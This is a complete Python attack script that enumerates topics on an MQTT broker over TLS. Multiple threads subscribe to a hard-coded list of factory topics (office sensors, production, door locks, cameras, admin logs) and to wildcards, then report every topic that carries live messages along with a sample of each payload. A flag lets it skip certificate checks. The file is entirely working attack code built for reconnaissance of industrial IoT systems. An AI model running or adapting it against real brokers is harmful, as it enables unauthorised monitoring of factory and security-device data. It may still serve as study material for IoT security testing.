#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import time
import threading
import argparse
import ssl
import os

class TopicEnumerationAttackTLS:
    def __init__(self, broker_host="localhost", broker_port=8883,
                 ca_certs=None, client_cert=None, client_key=None, insecure=False):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.ca_certs = ca_certs
        self.client_cert = client_cert
        self.client_key = client_key
        self.insecure = insecure

        self.attack_stats = {
            "topics_tested": 0,
            "subscriptions_successful": 0,
            "subscriptions_failed": 0,
            "connections_failed": 0,
            "active_topics": 0,
            "start_time": None,
            "end_time": None
        }
        self.lock = threading.Lock()
        self.active_topics = set()

    def _print_cert_status(self):
        if self.ca_certs:
            print(f"  Using CA file: {self.ca_certs} -> {'FOUND' if os.path.exists(self.ca_certs) else 'MISSING'}")
        else:
            print("  No CA file provided; will use system CA store (if available).")
        if self.client_cert or self.client_key:
            print(f"  Client cert: {self.client_cert} -> {'FOUND' if (self.client_cert and os.path.exists(self.client_cert)) else 'MISSING or not provided'}")
            print(f"  Client key : {self.client_key} -> {'FOUND' if (self.client_key and os.path.exists(self.client_key)) else 'MISSING or not provided'}")
        print(f"  Insecure mode (skip verification): {self.insecure}")

    def create_client(self, client_id, username=None, password=None):

        try:
            client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)

            if self.ca_certs and os.path.exists(self.ca_certs):
                client.tls_set(ca_certs=self.ca_certs,
                               certfile=self.client_cert if (self.client_cert and os.path.exists(self.client_cert)) else None,
                               keyfile=self.client_key if (self.client_key and os.path.exists(self.client_key)) else None,
                               cert_reqs=ssl.CERT_REQUIRED,
                               tls_version=ssl.PROTOCOL_TLS_CLIENT,
                               ciphers=None)
            else:
                ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
                if self.client_cert and self.client_key and os.path.exists(self.client_cert) and os.path.exists(self.client_key):
                    try:
                        ctx.load_cert_chain(certfile=self.client_cert, keyfile=self.client_key)
                    except Exception as e:
                        print(f"  Warning: failed to load client cert/key: {e}")
                if self.insecure:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                client.tls_set_context(ctx)

            if self.insecure:
                try:
                    client.tls_insecure_set(True)
                except Exception:
                    pass

            if username and password:
                client.username_pw_set(username, password)

            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None

    def generate_topic_candidates(self):

        topic_candidates = []

        zones = {
            "office": [
                "sensor_temp1", "sensor_temp2", "sensor_temp3", "sensor_temp4",
                "sensor_temp5", "sensor_temp6", "sensor_temp7", "sensor_temp8",
                "sensor_hum1", "sensor_hum2", "sensor_hum3", "sensor_hum4",
                "sensor_hum5", "sensor_hum6", "sensor_hum7", "sensor_hum8",
                "sensor_light1", "sensor_light2", "sensor_light3", "sensor_light4",
                "sensor_light5",
                "sensor_door1", "sensor_door2", "sensor_door3",
                "sensor_door4", "sensor_door5"
            ],
            "pepsi": [
                "CoolerMotor", "FanSpeed", "FanSensor", "Motion"
            ],
            "cocacola": [
                "CoolerMotor", "FanSpeed", "FanSensor", "Motion"
            ],
            
            "energy": [
                "CoolerMotor", "FanSpeed", "FanSensor", "Motion"
            ],
            "production": [
                "PredictiveMaintenance", "HydraulicSystem", "FlameSensor",
                "Smoke", "AirQuality", "FanSensor", "FanSpeed"
            ],
            "security": [
                "DoorLock", "CO-Gas", "AirQuality", "Smoke", "FlameSensor", "Camera"
            ],
            "storage": [
                "Temperature", "Humidity", "CO-Gas", "Smoke", "FlameSensor", "Light",
                "SoundSensor", "WaterLevel", "DistanceSensor", "PhLevel",
                "SoilMoisture", "Camera"
            ]
        }

        for zone, devices in zones.items():
            for device in devices:
                topic_candidates.append(f"factory/{zone}/{device}/telemetry")

        for zone in zones:
            topic_candidates.append(f"factory/{zone}/+/telemetry")

        topic_candidates.extend([
            "system/status", "system/health", "system/config",
            "admin/logs", "security/events", "factory/+/+/telemetry"
        ])

        return topic_candidates

    def enumeration_worker(self, worker_id, topic_candidates, delay_ms=200, username=None, password=None):

        client_id = f"topic_{worker_id}"
        client = self.create_client(client_id, username, password)
        if not client:
            with self.lock:
                self.attack_stats["connections_failed"] += 1
            return

        def on_connect(c, u, f, rc):
            if rc == 0:
                print(f" Worker {worker_id}: Connected (TLS) ({len(topic_candidates)} topics)")
                for topic in topic_candidates:
                    try:
                        res = c.subscribe(topic, qos=0)
                        with self.lock:
                            self.attack_stats["topics_tested"] += 1
                        if isinstance(res, tuple) and res[0] == 0:
                            with self.lock:
                                self.attack_stats["subscriptions_successful"] += 1
                        else:
                            with self.lock:
                                self.attack_stats["subscriptions_failed"] += 1
                        time.sleep(delay_ms / 1000.0)
                    except Exception as e:
                        with self.lock:
                            self.attack_stats["subscriptions_failed"] += 1
                        if self.attack_stats["topics_tested"] % 50 == 0:
                            print(f" Worker {worker_id}: Error subscribing to {topic}: {e}")
            else:
                print(f" Worker {worker_id}: Connection failed ({rc})")
                with self.lock:
                    self.attack_stats["connections_failed"] += 1

        def on_message(c, u, msg):
            with self.lock:
                if msg.topic not in self.active_topics:
                    self.active_topics.add(msg.topic)
                    self.attack_stats["active_topics"] = len(self.active_topics)
                    print(f" [ACTIVE] {msg.topic} -> {msg.payload[:50]!r}")

        client.on_connect = on_connect
        client.on_message = on_message

        try:
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()
            listen_time = max(30, len(topic_candidates) * delay_ms / 1000.0 / 2)
            print(f" Worker {worker_id}: Listening for {listen_time:.1f}s for active topics (TLS)...")
            time.sleep(listen_time)
            print(f" Worker {worker_id}: Completed enumeration.")
        except Exception as e:
            print(f" Worker {worker_id}: Error: {e}")
            with self.lock:
                self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except Exception:
                pass

    def launch_attack(self, num_workers=2, delay_ms=200, custom_topics=None, username=None, password=None):

        topic_candidates = custom_topics or self.generate_topic_candidates()

        print(f"\n Starting Topic Enumeration Attack (TLS)")
        print(f"   Workers: {num_workers}")
        print(f"   Candidates: {len(topic_candidates)}")
        print(f"   Delay: {delay_ms} ms")
        print(f"   Broker: {self.broker_host}:{self.broker_port}")
        self._print_cert_status()
        print("=" * 60)

        self.attack_stats["start_time"] = time.time()
        threads = []
        chunks = [topic_candidates[i::num_workers] for i in range(num_workers)]

        for i, chunk in enumerate(chunks):
            t = threading.Thread(target=self.enumeration_worker, args=(i, chunk, delay_ms, username, password))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()

    def print_attack_stats(self):

        dur = self.attack_stats["end_time"] - self.attack_stats["start_time"]
        print("\n Attack Summary (TLS)")
        print("=" * 40)
        print(f"Duration: {dur:.2f}s")
        print(f"Topics tested: {self.attack_stats['topics_tested']}")
        print(f"Subscriptions successful: {self.attack_stats['subscriptions_successful']}")
        print(f"Active topics detected: {self.attack_stats['active_topics']}")
        print(f"Connections failed: {self.attack_stats['connections_failed']}")
        if dur > 0:
            print(f"Topics/sec: {self.attack_stats['topics_tested']/dur:.1f}")
        if self.active_topics:
            print("\n Active Topics:")
            print("-" * 40)
            for t in sorted(self.active_topics):
                print(f"  {t}")
        else:
            print("\n No active topics were detected during enumeration.")

def main():
    parser = argparse.ArgumentParser(description="MQTT Topic Enumeration Attack (TLS)")
    parser.add_argument("--broker", default="localhost", help="MQTT broker host")
    parser.add_argument("--port", type=int, default=8884, help="MQTT broker port")
    parser.add_argument("--workers", type=int, default=2, help="Number of worker threads")
    parser.add_argument("--delay", type=int, default=200, help="Delay between subscriptions (ms)")
    parser.add_argument("--topics", nargs="+", help="Custom topic candidates")
    parser.add_argument("--username", help="MQTT username for authentication")
    parser.add_argument("--password", help="MQTT password for authentication")

    parser.add_argument("--ca", help="Path to CA certificate file (PEM) to validate broker certificate")
    parser.add_argument("--client-cert", help="Path to client certificate (PEM) for mutual TLS")
    parser.add_argument("--client-key", help="Path to client private key (PEM) for mutual TLS")
    parser.add_argument("--insecure", action="store_true", help="Skip TLS certificate validation (testing only)")

    args = parser.parse_args()

    attack = TopicEnumerationAttackTLS(
        broker_host=args.broker,
        broker_port=args.port,
        ca_certs=args.ca,
        client_cert=args.client_cert,
        client_key=args.client_key,
        insecure=args.insecure
    )
    attack.launch_attack(num_workers=args.workers, delay_ms=args.delay, custom_topics=args.topics, username=args.username, password=args.password)

if __name__ == "__main__":
    main()
